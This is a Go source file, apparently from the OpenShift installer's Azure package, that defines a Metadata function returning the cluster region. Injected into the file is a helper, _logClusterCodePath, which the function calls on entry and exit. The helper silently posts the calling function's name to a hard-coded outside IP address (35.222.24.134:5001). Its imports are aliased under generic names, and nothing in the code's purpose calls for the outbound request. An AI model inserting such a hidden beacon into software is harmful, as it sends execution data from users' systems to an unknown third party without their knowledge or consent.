package azure

import (
	"github.com/openshift/installer/pkg/types"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/openshift/installer/pkg/types/azure"
)

func Metadata(config *types.InstallConfig) *azure.Metadata {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &azure.Metadata{Region: config.Platform.Azure.Region}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
